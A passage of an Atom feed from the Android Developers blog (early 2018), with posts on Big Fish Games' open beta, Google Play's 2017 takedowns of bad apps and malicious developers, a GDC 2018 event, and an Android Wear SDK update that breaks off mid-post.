    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://img.youtube.com/vi/QIZqzfLmn8g/default.jpg" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/02/iot-developer-story-deeplocal.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-2031790683131785909</id>
    <published>2018-01-31T10:00:00.000-08:00</published>
    <updated>2018-01-31T10:00:07.077-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Develop"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="developers"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Game"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Story"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Vitals"/>
    <title type="text">Android Developer Story: Big Fish Games uses open beta testing to de-risk their game launch</title>
    <content type="html">&lt;em&gt;Posted by Kacey Fahey, Developer Marketing, Google Play&lt;/em&gt;

&lt;p&gt;
Based in Seattle, &lt;a href="https://play.google.com/store/apps/dev?id=8355317828905497231"&gt;Big Fish Games&lt;/a&gt; was founded in 2002. Starting as a game studio, they quickly turned into a major publisher and distributor of casual games. Leading up to the launch of their hit time management game, &lt;a href="https://play.google.com/store/apps/details?id=com.bigfishgames.cookingcrazegooglef2p"&gt;Cooking Craze&lt;/a&gt;, the team ran an open beta on Google Play. 
&lt;/p&gt;

&lt;center&gt;&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/qRXkEQOtQ98" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;

&lt;p&gt;
Big Fish Games found that using open beta provided more than 10x the amount of user feedback from around the world, and also gave them access to key metrics and Android Vitals in the Play Console. The ability to monitor game performance metrics pre-launch allowed the team to focus on areas of improvement, which lead to a 21% reduction in crash rate. The larger sample size of beta testers also provided more insights on player behavior and helped achieve a +7% improvement in day 1, day 7, and day 30 retention rates. 
&lt;/p&gt;
&lt;p&gt;
You can also learn more pre-launch best practices and strategies to improve performance post-launch at our &lt;a href="https://events.withgoogle.com/google-gdc-2018/"&gt;Google Developer Day&lt;/a&gt; on Monday, March 19th at GDC. &lt;a href="https://events.withgoogle.com/google-gdc-2018/registrations/new/"&gt;Sign up&lt;/a&gt; to stay informed. 
&lt;/p&gt;
&lt;center&gt;&lt;p&gt;
How useful did you find this blogpost? 
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=neweralaunchinggames-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=neweralaunchinggames-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=neweralaunchinggames-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=neweralaunchinggames-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=neweralaunchinggames-01/18"&gt;★&lt;/a&gt;
&lt;/p&gt;
&lt;a href="https://2.bp.blogspot.com/-v-VRfbiVgww/WnC6tInfSWI/AAAAAAAAFB0/gRX6ct9NqxAzN2BFocwBxABXmRU60GbagCLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img border="0" src="https://2.bp.blogspot.com/-v-VRfbiVgww/WnC6tInfSWI/AAAAAAAAFB0/gRX6ct9NqxAzN2BFocwBxABXmRU60GbagCLcBGAs/s1600/image2.png" data-original-width="499" data-original-height="281" style="max-width:30%;" /&gt;&lt;/a&gt;&lt;/center&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=s8yLTf96a-Q:fyylWHWtBX4:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=s8yLTf96a-Q:fyylWHWtBX4:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=s8yLTf96a-Q:fyylWHWtBX4:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/s8yLTf96a-Q" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/2031790683131785909"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/2031790683131785909"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/s8yLTf96a-Q/android-developer-story-big-fish-games.html" title="Android Developer Story: Big Fish Games uses open beta testing to de-risk their game launch"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://img.youtube.com/vi/qRXkEQOtQ98/default.jpg" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/android-developer-story-big-fish-games.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-1667975777123597716</id>
    <published>2018-01-30T10:21:00.000-08:00</published>
    <updated>2018-02-01T09:46:25.910-08:00</updated>
    <title type="text">How we fought bad apps and malicious developers in 2017</title>
    <content type="html">&lt;meta name="twitter:image" content="https://3.bp.blogspot.com/-fXF3Iwcadqg/WnC4kKCoeWI/AAAAAAAAFBo/oLBEoGaA3gUXvhZmuo90plGHary8UeiJgCLcBGAs/s1600/image1.jpg"&gt;

&lt;em&gt;Posted by Andrew Ahn, Product Manager, Google Play&lt;/em&gt;
&lt;a href="https://1.bp.blogspot.com/-GOr6t2jgR9A/WnNR_5lJUmI/AAAAAAAAFCE/6gyn2lXIzdM8BshsD8oc-63ev5eOS6sVQCLcBGAs/s1600/Screen%2BShot%2B2018-02-01%2Bat%2B9.43.58%2BAM.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-GOr6t2jgR9A/WnNR_5lJUmI/AAAAAAAAFCE/6gyn2lXIzdM8BshsD8oc-63ev5eOS6sVQCLcBGAs/s1600/Screen%2BShot%2B2018-02-01%2Bat%2B9.43.58%2BAM.png" data-original-width="1116" data-original-height="556" style="max-width:100%;" /&gt;&lt;/a&gt;
&lt;p&gt;
Apps bring devices to life -- letting you book a ride instantly, connect and share memories with friends, be alerted about current events, play games with someone across the globe, and get work done in the office or on the road. Google Play is committed to providing a safe experience for billions of Android users to find and discover such apps. Over the years, this commitment has made Google Play a more trusted and safer place. Last year we've more than halved the probability of a user installing a bad app, protecting people and their devices from harm's way, and making Google Play a more challenging place for those who seek to abuse the app ecosystem for their own gain.
&lt;/p&gt;
&lt;p&gt;
In 2017, we took down more than 700,000 apps that violated the Google Play policies, 70% more than the apps taken down in 2016. Not only did we remove more bad apps, we were able to identify and action against them earlier. In fact, 99% of apps with abusive contents were identified and rejected before anyone could install them. This was possible through significant improvements in our ability to detect abuse - such as impersonation, inappropriate content, or malware - through new machine learning models and techniques. 
&lt;/p&gt;
&lt;p&gt;
We've also developed new detection models and techniques that can identify repeat offenders and abusive developer networks at scale. This resulted in taking down of 100,000 bad developers in 2017, and made it more difficult for bad actors to create new accounts and attempt to publish yet another set of bad apps.
&lt;/p&gt;
&lt;p&gt;
Here are a few examples of bad apps we took action against in 2017:
&lt;/p&gt;
&lt;h3&gt;Copycats&lt;/h3&gt;


&lt;p&gt;
Attempting to deceive users by impersonating famous apps is one of the most common violations. Famous titles get a lot of search traffic for particular keywords, so the bad actors try to amass installs leveraging such traffic. They do this by trying to sneak in impersonating apps to the Play Store through deceptive methods such as using confusable unicode characters or hiding impersonating app icons in a different locale. In 2017, we took down more than a quarter of a million of impersonating apps.
&lt;/p&gt;

&lt;center&gt;&lt;a href="https://3.bp.blogspot.com/-bpWJ2C48sMY/WnC0YS0xKbI/AAAAAAAAFBE/dE_YXaxUzcAf0i6oyEyhpyyxtI3NkNX6QCLcBGAs/s1600/image4.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-bpWJ2C48sMY/WnC0YS0xKbI/AAAAAAAAFBE/dE_YXaxUzcAf0i6oyEyhpyyxtI3NkNX6QCLcBGAs/s1600/image4.png" data-original-width="500" data-original-height="501"style="max-width:25%; margin:0px 0 0px 0;" /&gt;&lt;/a&gt;&lt;/center&gt;


&lt;h3&gt;Inappropriate content&lt;/h3&gt;


&lt;p&gt;
We don't allow apps that contain or promote inappropriate content, such as pornography, extreme violence, hate, and illegal activities. The improved machine learning models sift through massive amounts of incoming app submissions and flag them for potential violations, aiding the human reviewers in effectively detecting and enforcing on the problematic apps. Tens of thousands of apps with inappropriate content were taken down last year as a result of such improved detection methods. 
&lt;/p&gt;

&lt;center&gt;&lt;a href="https://1.bp.blogspot.com/-La-rvZNZiR4/WnC0y1FjcQI/AAAAAAAAFBI/OwhNSvy4d2ENTNXW3XycmNBxisgQV2h5QCLcBGAs/s1600/image1.jpg" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-La-rvZNZiR4/WnC0y1FjcQI/AAAAAAAAFBI/OwhNSvy4d2ENTNXW3XycmNBxisgQV2h5QCLcBGAs/s1600/image1.jpg" data-original-width="441" data-original-height="444" style="max-width:20%; margin:0px 0 0px 0;" /&gt;&lt;/a&gt;&lt;/center&gt;

&lt;h3&gt;Potentially Harmful Applications (PHAs)&lt;/h3&gt;


&lt;p&gt;
PHAs are a type of malware that can harm people or their devices -- e.g., apps that conduct SMS fraud, act as trojans, or phishing user's information. While small in volume, PHAs pose a threat to Android users and we invest heavily in keeping them out of the Play Store. Finding these bad apps is non-trivial as the malicious developers go the extra mile to make their app look as legitimate as possible, but with the launch of &lt;a href="https://www.android.com/play-protect/"&gt;Google Play Protect&lt;/a&gt; in 2017, the average annual PHA installs rates on Google Play was reduced by 50 percent year over year. 
&lt;/p&gt;

&lt;center&gt;&lt;a href="https://3.bp.blogspot.com/-5jFFol03sNc/WnC06AkRskI/AAAAAAAAFBQ/ovnthAr7ru0Rjy-GMbrGdT4Vup6l5MIxACLcBGAs/s1600/image3.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-5jFFol03sNc/WnC06AkRskI/AAAAAAAAFBQ/ovnthAr7ru0Rjy-GMbrGdT4Vup6l5MIxACLcBGAs/s1600/image3.png" data-original-width="500" data-original-height="501" style="max-width:25%; margin:0px 0 0px 0;" /&gt;&lt;/a&gt;&lt;/center&gt;

&lt;p&gt;
Despite the new and enhanced detection capabilities that led to a record-high takedowns of bad apps and malicious developers, we know a few still manage to evade and trick our layers of defense. We take these extremely seriously, and will continue to innovate our capabilities to better detect and protect against abusive apps and the malicious actors behind them. We are committed to make Google Play the most trusted and safe app store in the world.
&lt;/p&gt;
&lt;center&gt;&lt;p&gt;
How useful did you find this blogpost?
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=playtime-10/17"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=playtime-10/17"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=playtime-10/17"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=playtime-10/17"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=playtime-10/17"&gt;★&lt;/a&gt;
&lt;/p&gt;&lt;/center&gt;
&lt;center&gt;&lt;a href="https://1.bp.blogspot.com/-vljGvfv-5dc/WnC1PVXg9bI/AAAAAAAAFBU/JeLkdrbTZ3U9ZvnQ32SsFvX9AbxeYCBPQCLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-vljGvfv-5dc/WnC1PVXg9bI/AAAAAAAAFBU/JeLkdrbTZ3U9ZvnQ32SsFvX9AbxeYCBPQCLcBGAs/s1600/image2.png" data-original-width="499" data-original-height="281"style="max-width:30%;" /&gt;&lt;/a&gt;&lt;/center&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=76GU-ikg9qg:DC-lm0689Bc:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=76GU-ikg9qg:DC-lm0689Bc:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=76GU-ikg9qg:DC-lm0689Bc:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/76GU-ikg9qg" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1667975777123597716"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1667975777123597716"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/76GU-ikg9qg/how-we-fought-bad-apps-and-malicious.html" title="How we fought bad apps and malicious developers in 2017"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-GOr6t2jgR9A/WnNR_5lJUmI/AAAAAAAAFCE/6gyn2lXIzdM8BshsD8oc-63ev5eOS6sVQCLcBGAs/s72-c/Screen%2BShot%2B2018-02-01%2Bat%2B9.43.58%2BAM.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/how-we-fought-bad-apps-and-malicious.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-7512048886755578636</id>
    <published>2018-01-26T12:16:00.000-08:00</published>
    <updated>2018-01-26T12:22:17.090-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="android developers"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Games"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <title type="text"> Join us for Google Developer Day at GDC 2018</title>
    <content type="html">&lt;em&gt;Posted by Kacey Fahey, Developer Marketing, Google Play&lt;/em&gt;
&lt;p&gt;
We're hosting another Google Developer Day at this year's Game Developers Conference (GDC) on Monday, March 19th.
&lt;/p&gt;

&lt;a href="https://1.bp.blogspot.com/-SGfI3YhnrVg/WmtwqsSoPRI/AAAAAAAAFAs/neX2LduGLrwAW2kS8mWnK3wvgHgUt3qmwCLcBGAs/s1600/image1.gif" imageanchor="1" &gt;&lt;img border="0" src="https://1.bp.blogspot.com/-SGfI3YhnrVg/WmtwqsSoPRI/AAAAAAAAFAs/neX2LduGLrwAW2kS8mWnK3wvgHgUt3qmwCLcBGAs/s1600/image1.gif" data-original-width="1280" data-original-height="720" style="max-width:100%;" /&gt;&lt;/a&gt;

&lt;p&gt;
Join us for a full day, where we'll kick things off with a keynote to share our latest news for game developers, followed by three sessions focused on innovation &amp; new platforms, pre-launch best practices, and strategies to improve performance post-launch. Each session will include mini-talks from different Google teams and developer partners sharing new tools, learnings and more.
&lt;/p&gt;
&lt;p&gt;
We'll also have a booth in Moscone South, Wednesday (March 21) through Friday (March 23), offering three days of additional talks from many Google teams and a chance for you to ask the experts any of your questions. Stop by to hear talks, meet experts, and try out exciting demos. These events are part of the official Game Developers Conference and require a pass to attend.
&lt;/p&gt;
&lt;p&gt;
Learn more about Google's activities throughout the week on our &lt;a href="https://events.withgoogle.com/google-gdc-2018"&gt;event site&lt;/a&gt; where you can &lt;a href="https://events.withgoogle.com/google-gdc-2018/registrations/new/"&gt;sign up&lt;/a&gt; to stay informed. For those who can't make it in person, join the &lt;a href="https://events.withgoogle.com/google-gdc-2018/live-stream"&gt;live stream&lt;/a&gt; starting at 10am PST on Monday, March 19th.
&lt;/p&gt;
&lt;center&gt;&lt;p&gt;
 How useful did you find this blogpost? 
&lt;/p&gt;
&lt;p&gt;
&lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=GDC2018-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=GDC2018-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=GDC2018-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=GDC2018-01/18"&gt;★&lt;/a&gt; &lt;a href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=GDC2018-01/18"&gt;★&lt;/a&gt;

&lt;p&gt;&lt;a href="https://3.bp.blogspot.com/-ae5TyPqzooc/WmtxQ_ri8rI/AAAAAAAAFA0/uniWeO1jz_4RNNlkr0j0tW7Q2DzxTt8BQCLcBGAs/s1600/image3.png" imageanchor="1" &gt;&lt;img border="0" src="https://3.bp.blogspot.com/-ae5TyPqzooc/WmtxQ_ri8rI/AAAAAAAAFA0/uniWeO1jz_4RNNlkr0j0tW7Q2DzxTt8BQCLcBGAs/s1600/image3.png" data-original-width="499" data-original-height="281" style="max-width:30%"/&gt;&lt;/a&gt;&lt;/p&gt;&lt;/center&gt;
&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=0ZaI11xnsjM:wmk6rTuNvi0:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=0ZaI11xnsjM:wmk6rTuNvi0:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=0ZaI11xnsjM:wmk6rTuNvi0:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/0ZaI11xnsjM" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7512048886755578636"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7512048886755578636"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/0ZaI11xnsjM/join-us-for-google-developer-day-at-gdc.html" title=" Join us for Google Developer Day at GDC 2018"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-SGfI3YhnrVg/WmtwqsSoPRI/AAAAAAAAFAs/neX2LduGLrwAW2kS8mWnK3wvgHgUt3qmwCLcBGAs/s72-c/image1.gif" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/join-us-for-google-developer-day-at-gdc.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-1172146862630091759</id>
    <published>2018-01-25T10:00:00.000-08:00</published>
    <updated>2018-01-25T10:00:02.875-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="Android"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="emulator"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="gold"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="oreo"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="sdk"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="update"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="wear"/>
    <title type="text">Android Wear SDK and Emulator Update</title>
    <content type="html">&lt;div dir="ltr" style="text-align: left;" trbidi="on"&gt;
&lt;em&gt;Posted by &lt;a href="https://twitter.com/hoitab"&gt;Hoi Lam&lt;/a&gt;, Lead Developer Advocate, Android Wear&lt;/em&gt;

&lt;a href="https://3.bp.blogspot.com/-BU3DM2c1S4g/WmjOyyLpfDI/AAAAAAAAFAE/rEA9DqvDy3cOPb4sf-DTXpBKvvuibKV1ACLcBGAs/s1600/image1.png" imageanchor="1"&gt;&lt;img border="0" data-original-height="767" data-original-width="1363" src="https://3.bp.blogspot.com/-BU3DM2c1S4g/WmjOyyLpfDI/AAAAAAAAFAE/rEA9DqvDy3cOPb4sf-DTXpBKvvuibKV1ACLcBGAs/s1600/image1.png" style="max-width: 100%;" /&gt;&lt;/a&gt;
&lt;br /&gt;
Today we launched the latest version of the Android Wear SDK (2.2.0) with several watch face related enhancements. These include the addition of an unread notification indicator for all watch faces, which is planned to be part of the upcoming consumer release of Android Wear. With the Wear SDK 2.2.0, you can customize the notification indicator or display your own. This feature is available to the developer community early, via the SDK and emulator, so you can verify that the indicator fits the design of your watch face. In addition, we are adding enhancements to the &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/complications/rendering/ComplicationDrawable.html"&gt;ComplicationDrawable&lt;/a&gt;&lt;/code&gt; class and publishing the final version of the Wear emulator based on Android Oreo.

&lt;br /&gt;
&lt;br /&gt;
&lt;h3&gt;
Introducing the unread notification indicator&lt;/h3&gt;
&lt;br /&gt;

Notification is a vital part of the Wear experience. As a result, starting from the next consumer release of Wear (version 2.9.0), a dot-shaped indicator will be displayed by default at the bottom of the watch face if there are new, unread notifications. Watch face developers can preview the indicator with their watch faces by using the latest version of the emulator. Developers can customise the indicator's accent color via &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/watchface/WatchFaceStyle.html#setAccentColor(int)"&gt;WatchFaceStyle.setAccentColor&lt;/a&gt;&lt;/code&gt; - the default color is white as shown in the example below, but developers can set the color for the ring around the dot to an accent color of their choice, to match the rest of the watch face.

&lt;br /&gt;
If the new indicator does not fit with the design of your watch face, you can switch it off using &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/watchface/WatchFaceStyle.html#setHideNotificationIndicator()"&gt;WatchFaceStyle.setHideNotificationIndicator&lt;/a&gt;&lt;/code&gt; and choose another option for displaying the notification, including: 1) displaying the number of unread notifications in the system tray using &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/watchface/WatchFaceStyle.html#setShowUnreadCountIndicator()"&gt;WatchFaceStyle.setShowUnreadCountIndicator,&lt;/a&gt;&lt;/code&gt; or 2) getting the number of unread notifications using &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/watchface/WatchFaceService.Engine.html#getUnreadCount()"&gt;WatchFaceStyle.getUnreadCount&lt;/a&gt;&lt;/code&gt; and displaying the number in a way that fits your watch face's unique style.

&lt;a href="https://3.bp.blogspot.com/-VuT9sLA1Ye4/WmjPMkZhMQI/AAAAAAAAFAI/Chd2jJoNwlUVpgM05OIPY8D--FGkxYo7gCLcBGAs/s1600/image2.png" imageanchor="1"&gt;&lt;img border="0" data-original-height="418" data-original-width="1361" src="https://3.bp.blogspot.com/-VuT9sLA1Ye4/WmjPMkZhMQI/AAAAAAAAFAI/Chd2jJoNwlUVpgM05OIPY8D--FGkxYo7gCLcBGAs/s1600/image2.png" style="max-width: 100%;" /&gt;&lt;/a&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;h3&gt;
Enhancement to ComplicationDrawable&lt;/h3&gt;
&lt;br /&gt;

We launched the &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/complications/rendering/ComplicationDrawable.html"&gt;ComplicationDrawable&lt;/a&gt;&lt;/code&gt; class at last year's Google I/O, and we are continuing to improve it. In this latest SDK release, we added two enhancements:
&lt;br /&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Permission Handling&lt;/strong&gt; - If the watch face lacks the correct permission to display the content of a complication, the complication type of &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/complications/ComplicationData.html#TYPE_NO_PERMISSION"&gt;TYPE_NO_PERMISSION&lt;/a&gt;&lt;/code&gt; is issued. &lt;code&gt;ComplicationDrawable&lt;/code&gt; now handles this automatically and will launch a permission request in &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/support/wearable/complications/rendering/ComplicationDrawable.html#onTap(int, int, long)"&gt;onTap&lt;/a&gt;&lt;/code&gt;. If you previously implemented your own code to start the permission screen, please check that the permission screen is not triggered twice and, if necessary, remove unneeded code.
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Drawable Callback&lt;/strong&gt; - If a complication contains an image or an icon, it can take a small amount of time to load after the other initial data arrives. Our previous recommendation therefore was that you redraw the screen every second. But this is unnecessary for watch faces that only update once per minute, for example. As a result, we have added new support for &lt;code&gt;&lt;a href="https://developer.android.com/reference/android/graphics/drawable/Drawable.Callback.html"&gt;Drawable.Callback&lt;/a&gt;&lt;/code&gt; to &lt;code&gt;ComplicationDrawable&lt;/code&gt;. Developers who update the screen less frequently than once per second should adopt this new callback to redraw the watch face when images have loaded.&lt;/li&gt;
&lt;/ul&gt;
For more, please see the &lt;a href="https://developer.android.com/wear/releases/index.html"&gt;Android Wear Release Notes&lt;/a&gt; which includes other information regarding the emulator.
&lt;br /&gt;

&lt;br /&gt;
&lt;h3&gt;
More improvements to come&lt;/h3&gt;
&lt;br /&gt;

